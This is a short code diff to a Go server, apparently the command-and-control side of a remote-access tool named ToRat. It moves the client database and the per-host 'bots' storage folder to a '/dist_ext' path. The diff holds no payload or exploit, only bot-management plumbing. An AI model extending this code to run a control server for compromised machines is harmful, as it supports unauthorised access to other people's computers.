@@ -27,7 +27,7 @@ var activeClients []activeClient
 // Start runs the server
 func Start() error {
 	var err error // this is needed for gorm
-	db, err = gorm.Open(sqlite.Open("ToRat.db"), &gorm.Config{})
+	db, err = gorm.Open(sqlite.Open("/dist_ext/ToRat.db"), &gorm.Config{})
 	if err != nil {
 		log.Fatalln("Could not open db", err)
 	}
@@ -83,7 +83,10 @@ func accept(conn net.Conn) {
 		log.Println("Invalid Hostname:", err)
 		return
 	}
-	c.Client = Client{Hostname: c.Hostname, Path: filepath.Join("bots", c.Hostname)}
+	c.Client = Client{
+		Hostname: c.Hostname,
+		Path:     filepath.Join("/dist_ext/bots", c.Hostname),
+	}
 
 	db.FirstOrCreate(&c.Client, Client{Hostname: c.Hostname})
 
